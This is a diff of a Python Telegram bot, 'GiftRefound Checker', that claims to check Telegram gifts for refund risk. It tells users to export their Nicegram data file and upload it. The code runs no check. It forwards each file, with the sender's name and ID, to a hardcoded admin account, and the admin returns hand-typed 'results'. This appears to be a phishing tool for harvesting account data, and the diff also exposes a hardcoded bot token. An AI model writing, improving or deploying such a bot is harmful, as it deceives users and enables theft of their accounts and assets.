@@ -5,8 +5,6 @@ from datetime import datetime
 
 BOT_TOKEN = "7956796612:AAFRjhOw_4yT0039kOnmMHQEdoDrJchT3go"
 ADMIN_ID = 8362897345
-SUPPORT_ID = 6592407529
-SUPPORT_USERNAME = "@tritophia"
 DB = "refound_bot.db"
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -29,28 +27,26 @@ def init_db():
 @bot.message_handler(commands=['start'])
 def start(message):
     keyboard = InlineKeyboardMarkup()
-    keyboard.row(InlineKeyboardButton("🔍 Проверить на Refound", callback_data="check_refound"))
-    keyboard.row(InlineKeyboardButton("📖 Инструкция", callback_data="instruction"))
-    keyboard.row(InlineKeyboardButton("💎 Премиум проверка", callback_data="premium"))
-    keyboard.row(InlineKeyboardButton("👨‍💻 Поддержка", callback_data="support"))
+    keyboard.row(InlineKeyboardButton("Проверить на Refound", callback_data="check_refound"))
+    keyboard.row(InlineKeyboardButton("Инструкция", callback_data="instruction"))
     
     caption = """
-🎁 <b>Добро пожаловать в GiftRefound Checker!</b>
+<b>Добро пожаловать в GiftRefound Checker!</b>
 
 Здесь ты можешь проверить любой Telegram-подарок на возможность возврата (Refound) перед покупкой!
 
-🔍 <b>Проверка покажет:</b>
+<b>Проверка покажет:</b>
 • Возможен ли возврат подарка
 • Историю предыдущих возвратов  
 • Риски при покупке
 • Рекомендации по безопасности
 
-⚡ <b>Как это работает?</b>
+<b>Как это работает?</b>
 1. Скачиваешь файл данных из Nicegram
 2. Отправляешь его боту
-3. Получаешь детальный анализ за 5 секунд!
+3. Получаешь детальный анализ
 
-🛡️ <b>Покупай с уверенностью!</b>
+<b>Покупай с уверенностью!</b>
     """
     
     bot.send_photo(message.chat.id, "https://i.postimg.cc/gXgxWWVs/design-image.jpg", 
@@ -60,30 +56,31 @@ def start(message):
 def handle_callback(call):
     if call.data == "check_refound":
         instruction_text = """
-📁 <b>Отправьте файл данных Nicegram</b>
+<b>Отправьте файл данных Nicegram</b>
 
 1. Откройте Nicegram
-2. Зайдите в Настройки → Nicegram 
+2. Зайдите в Настройки -> Nicegram 
 3. Нажмите "Экспортировать в файл"
 4. Отправьте полученный файл сюда
 
-⏳ <b>Проверка займет 5-10 минут</b>
+<b>Проверка займет 5-10 минут</b>
 После анализа вы получите полный отчет о возможности возврата подарка.
         """
+        keyboard = InlineKeyboardMarkup()
+        keyboard.add(InlineKeyboardButton("Назад", callback_data="back_to_menu"))
         bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
-                               caption=instruction_text, parse_mode='HTML',
-                               reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu")))
+                               caption=instruction_text, parse_mode='HTML', reply_markup=keyboard)
     
     elif call.data == "instruction":
         instruction_text = """
-📖 <b>Инструкция по проверке:</b>
+<b>Инструкция по проверке:</b>
 
 1. <b>Скачайте Nicegram</b>
    - Нажмите кнопку ниже для скачивания
 
 2. <b>Экспортируйте данные:</b>
    - Откройте Nicegram
-   - Настройки → Nicegram
+   - Настройки -> Nicegram
    - "Экспортировать в файл"
 
 3. <b>Отправьте файл боту</b>
@@ -96,85 +93,35 @@ def handle_callback(call):
    - Вы получите детальный отчет
         """
         keyboard = InlineKeyboardMarkup()
-        keyboard.add(InlineKeyboardButton("📱 Скачать Nicegram", url="https://nicegram.app"))
-        keyboard.add(InlineKeyboardButton("🔍 Проверить файл", callback_data="check_refound"))
-        keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu"))
+        keyboard.add(InlineKeyboardButton("Скачать Nicegram", url="https://nicegram.app"))
+        keyboard.add(InlineKeyboardButton("Проверить файл", callback_data="check_refound"))
+        keyboard.add(InlineKeyboardButton("Назад", callback_data="back_to_menu"))
         
         bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                caption=instruction_text, parse_mode='HTML', reply_markup=keyboard)
     
-    elif call.data == "premium":
-        premium_text = f"""
-💎 <b>Премиум проверка</b>
-
-<b>Что входит:</b>
-• Приоритетная обработка (2-3 минуты)
-• Расширенный анализ истории
-• Персональные рекомендации
-• Поддержка 24/7
-
-<b>Стоимость:</b>
-• 1 проверка - 50 руб
-• 5 проверок - 200 руб
-• 10 проверок - 350 руб
-
-💬 <b>Для активации напишите в поддержку:</b>
-{SUPPORT_USERNAME}
-        """
-        keyboard = InlineKeyboardMarkup()
-        keyboard.add(InlineKeyboardButton("👨‍💻 Написать в поддержку", url=f"https://t.me/{SUPPORT_USERNAME[1:]}")))
-        keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu"))
-        
-        bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
-                               caption=premium_text, parse_mode='HTML', reply_markup=keyboard)
-    
-    elif call.data == "support":
-        support_text = f"""
-👨‍💻 <b>Поддержка</b>
-
-По всем вопросам обращайтесь:
-• По поводу проверок
-• Технические проблемы  
-• Премиум доступ
-• Сотрудничество
-
-📞 <b>Связь:</b>
-{SUPPORT_USERNAME}
-
-⏰ <b>Время работы:</b>
-Круглосуточно
-        """
-        keyboard = InlineKeyboardMarkup()
-        keyboard.add(InlineKeyboardButton("💬 Написать", url=f"https://t.me/{SUPPORT_USERNAME[1:]}")))
-        keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu"))
-        
-        bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
-                               caption=support_text, parse_mode='HTML', reply_markup=keyboard)
-    
     elif call.data == "back_to_menu":
         keyboard = InlineKeyboardMarkup()
-        keyboard.row(InlineKeyboardButton("🔍 Проверить на Refound", callback_data="check_refound"))
-        keyboard.row(InlineKeyboardButton("📖 Инструкция", callback_data="instruction"))
-        keyboard.row(InlineKeyboardButton("💎 Премиум проверка", callback_data="premium"))
-        keyboard.row(InlineKeyboardButton("👨‍💻 Поддержка", callback_data="support"))
+        keyboard.row(InlineKeyboardButton("Проверить на Refound", callback_data="check_refound"))
+        keyboard.row(InlineKeyboardButton("Инструкция", callback_data="instruction"))
         
         caption = """
-🎁 <b>Добро пожаловать в GiftRefound Checker!</b>
+<b>Добро пожаловать в GiftRefound Checker!</b>
 
 Здесь ты можешь проверить любой Telegram-подарок на возможность возврата (Refound) перед покупкой!
 
-🔍 <b>Проверка покажет:</b>
+<b>Проверка покажет:</b>
 • Возможен ли возврат подарка
 • Историю предыдущих возвратов  
 • Риски при покупке
 • Рекомендации по безопасности
 
-⚡ <b>Как это работает?</b>
+<b>Как это работает?</b>
 1. Скачиваешь файл данных из Nicegram
 2. Отправляешь его боту
-3. Получаешь детальный анализ за 5 секунд!
+3. Получаешь детальный анализ
 
-🛡️ <b>Покупай с уверенностью!</b>
+<b>Покупай с уверенностью!</b>
         """
         
         bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
@@ -184,21 +131,21 @@ def handle_callback(call):
 def handle_file(message):
     user = message.from_user
     
-    bot.reply_to(message, "🔍 <b>Файл получен! Начинаем проверку...</b>\n\n⏳ <b>Примерное время:</b> 5-10 минут\n📊 <b>Статус:</b> Анализ данных...\n\nМы пришлем вам результат как только проверка будет завершена!", parse_mode='HTML')
+    # Цитируем сообщение с файлом
+    bot.reply_to(message, "<b>Файл получен! Начинаем проверку...</b>\n\n<b>Примерное время:</b> 5-10 минут\n<b>Статус:</b> Анализ данных...\n\nМы пришлем вам результат как только проверка будет завершена!", parse_mode='HTML')
     
     admin_text = f"""
-📨 <b>Новый файл для проверки!</b>
+<b>Новый файл для проверки!</b>
 
-👤 <b>Пользователь:</b> {user.first_name} (@{user.username})
-🆔 <b>ID:</b> {user.id}
-📅 <b>Время:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-💾 <b>Файл:</b> {message.document.file_name}
+<b>Пользователь:</b> {user.first_name} (@{user.username})
+<b>ID:</b> {user.id}
+<b>Время:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+<b>Файл:</b> {message.document.file_name}
     """
     
     try:
-        # Отправляем файл админу и в поддержку
+        # Пересылаем файл админу с цитированием
         bot.send_document(ADMIN_ID, message.document.file_id, caption=admin_text, parse_mode='HTML')
-        bot.send_document(SUPPORT_ID, message.document.file_id, caption=admin_text, parse_mode='HTML')
         
         conn = sqlite3.connect(DB)
         cur = conn.cursor()
@@ -207,15 +154,15 @@ def handle_file(message):
         conn.commit()
         conn.close()
         
-        print(f"Файл от {user.id} переслан админу и в поддержку")
+        print(f"Файл от {user.id} переслан админу")
         
     except Exception as e:
         print(f"Ошибка: {e}")
-        bot.reply_to(message, "❌ Ошибка при обработке файла. Попробуйте позже.")
+        bot.reply_to(message, "Ошибка при обработке файла. Попробуйте позже.")
 
 @bot.message_handler(commands=['result'])
 def send_result(message):
-    if message.from_user.id not in [ADMIN_ID, SUPPORT_ID]:
+    if message.from_user.id != ADMIN_ID:
         return
     
     args = message.text.split()[1:]
@@ -227,8 +174,9 @@ def send_result(message):
     result_text = " ".join(args[1:])
     
     try:
-        bot.send_message(user_id, f"📊 <b>Результат проверки:</b>\n\n{result_text}", parse_mode='HTML')
-        bot.reply_to(message, "✅ Результат отправлен пользователю")
+        # Отправляем результат пользователю
+        bot.send_message(user_id, f"<b>Результат проверки:</b>\n\n{result_text}", parse_mode='HTML')
+        bot.reply_to(message, "Результат отправлен пользователю")
         
         conn = sqlite3.connect(DB)
         cur = conn.cursor()
@@ -238,10 +186,9 @@ def send_result(message):
         conn.close()
         
     except Exception as e:
-        bot.reply_to(message, f"❌ Ошибка: {e}")
+        bot.reply_to(message, f"Ошибка: {e}")
 
 if __name__ == "__main__":
     init_db()
-    print("✅ Бот для проверки Refound запущен!")
-    print(f"✅ Поддержка: {SUPPORT_USERNAME} (ID: {SUPPORT_ID})")
+    print("Бот для проверки Refound запущен!")
     bot.polling(none_stop=True)
